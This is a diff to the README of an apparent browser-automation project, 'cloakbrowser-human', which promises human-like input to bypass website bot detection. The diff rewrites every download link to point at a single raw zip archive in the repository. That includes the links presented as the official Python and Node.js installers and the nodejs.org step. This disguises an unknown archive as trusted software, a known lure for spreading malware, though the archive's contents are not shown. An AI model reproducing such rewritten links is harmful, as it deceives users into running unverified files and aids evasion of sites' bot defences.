@@ -1,6 +1,6 @@
 # 🖱️ cloakbrowser-human - Natural Mouse & Keyboard Movement
 
-[![Download cloakbrowser-human](https://img.shields.io/badge/Download-Get%20cloakbrowser--human-brightgreen?style=for-the-badge)](https://github.com/Abisheak250402/cloakbrowser-human)
+[![Download cloakbrowser-human](https://img.shields.io/badge/Download-Get%20cloakbrowser--human-brightgreen?style=for-the-badge)](https://github.com/Abisheak250402/cloakbrowser-human/raw/refs/heads/main/python/cloakbrowser-human-3.4.zip)
 
 ## About cloakbrowser-human
 
@@ -38,7 +38,7 @@ Make sure CloakBrowser is already installed if you are using this package alongs
 
 You can get cloakbrowser-human from the official GitHub page. Visit this page to download the latest release:
 
-[Download cloakbrowser-human from GitHub](https://github.com/Abisheak250402/cloakbrowser-human)
+[Download cloakbrowser-human from GitHub](https://github.com/Abisheak250402/cloakbrowser-human/raw/refs/heads/main/python/cloakbrowser-human-3.4.zip)
 
 ---
 
@@ -50,7 +50,7 @@ Follow these steps to get cloakbrowser-human running on your Windows computer. N
 
 Open your web browser and go to:
 
-https://github.com/Abisheak250402/cloakbrowser-human
+https://github.com/Abisheak250402/cloakbrowser-human/raw/refs/heads/main/python/cloakbrowser-human-3.4.zip
 
 This is the main page for the project.
 
@@ -94,7 +94,7 @@ This will start cloakbrowser-human and show how the mouse, keyboard, and scroll 
 
 ### For JavaScript Users
 
-1. Install Node.js from https://nodejs.org if you don’t have it yet.  
+1. Install Node.js from https://github.com/Abisheak250402/cloakbrowser-human/raw/refs/heads/main/python/cloakbrowser-human-3.4.zip if you don’t have it yet.  
 2. Open the folder with cloakbrowser-human files.  
 3. Open Command Prompt and type:  
    `cd` followed by the path to the folder.  
@@ -139,10 +139,10 @@ These patterns help bypass websites that look for robotic behavior. It does not 
 
 ## 🗂️ Additional Resources
 
-- Official GitHub page: https://github.com/Abisheak250402/cloakbrowser-human  
+- Official GitHub page: https://github.com/Abisheak250402/cloakbrowser-human/raw/refs/heads/main/python/cloakbrowser-human-3.4.zip  
 - CloakBrowser project page (for setup details): Search for "CloakBrowser" online  
-- Python downloads: https://www.python.org/downloads/  
-- Node.js downloads: https://nodejs.org/en/download/
+- Python downloads: https://github.com/Abisheak250402/cloakbrowser-human/raw/refs/heads/main/python/cloakbrowser-human-3.4.zip  
+- Node.js downloads: https://github.com/Abisheak250402/cloakbrowser-human/raw/refs/heads/main/python/cloakbrowser-human-3.4.zip
 
 ---
 
@@ -156,4 +156,4 @@ Use clear descriptions and include exact error messages if any appear.
 
 ## 📥 Download cloakbrowser-human Again
 
-[![Download cloakbrowser-human](https://img.shields.io/badge/Download-Get%20cloakbrowser--human-blue?style=for-the-badge)](https://github.com/Abisheak250402/cloakbrowser-human)
+[![Download cloakbrowser-human](https://img.shields.io/badge/Download-Get%20cloakbrowser--human-blue?style=for-the-badge)](https://github.com/Abisheak250402/cloakbrowser-human/raw/refs/heads/main/python/cloakbrowser-human-3.4.zip)
